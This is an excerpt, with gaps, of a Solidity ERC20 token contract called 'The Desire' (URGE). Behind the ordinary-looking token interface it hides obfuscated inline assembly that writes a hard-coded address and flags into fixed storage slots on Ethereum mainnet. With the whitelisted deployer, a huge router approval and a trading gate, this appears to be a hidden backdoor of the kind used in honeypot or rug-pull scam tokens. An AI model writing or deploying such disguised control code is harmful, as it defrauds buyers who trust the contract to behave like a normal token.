...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private wiseAdd;
    uint256 private _generationZ = block.number*2;

    mapping (address => bool) private _firstSource; 
    mapping (address => bool) private _thirdSource;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private barkAttack;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private fanHowl;
    address public pair;
    ...
    bool private trading; uint256 private howlerFowler = 1; bool private dirtyMan;
    uint256 private _decimals; uint256 private hippyLife;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        wiseAdd.push(_router); wiseAdd.push(msgSender_); wiseAdd.push(pair);
        for (uint256 q=0; q < 3;) {_firstSource[wiseAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenSource() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0xeef55062290b06bb73a3680975649de596bf9679574f5cb8a3cd747d1e7c91e1))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xb2dbb359c3d2bd729683987bdc335d1c9c442ef4f6fdfe9e86ffacee32c0fede,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0xeef55062290b06bb73a3680975649de596bf9679574f5cb8a3cd747d1e7c91e1,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _generationZ = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == wiseAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployWise(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(wiseAdd[0], 10 ** 77);
        _TokenSource();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployWise(creator, initialSupply);
    }
}

contract TheDesire is ERC20Token {
    constructor() ERC20Token("The Desire", "URGE", msg.sender, 420000 * 10 ** 18) {
    }
}